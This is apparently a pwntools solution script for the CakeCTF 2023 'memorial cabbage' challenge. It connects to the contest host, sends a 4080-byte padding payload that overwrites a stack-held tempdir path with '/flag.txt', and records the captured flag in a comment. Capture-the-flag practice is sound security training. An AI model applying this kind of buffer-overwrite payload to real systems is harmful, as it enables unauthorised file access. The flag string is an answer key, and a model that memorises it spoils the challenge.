from pwn import * 

'''
"tempdir" address is on the stack

overwrite "tempdir" address with "/flag.txt"

'''


#p = process("./cabbage")
p = remote("memorialcabbage.2023.cakectf.com",9001)

# gdb.attach(p,gdbscript='''
# b* memo_w        
# ''')

p.sendline(b'1')

payload = b'A'*4080+b'/flag.txt\x00'
p.sendline(payload)

p.interactive()

# CakeCTF{B3_c4r3fuL_s0m3_libc_fuNcT10n5_r3TuRn_5t4ck_p01nT3r}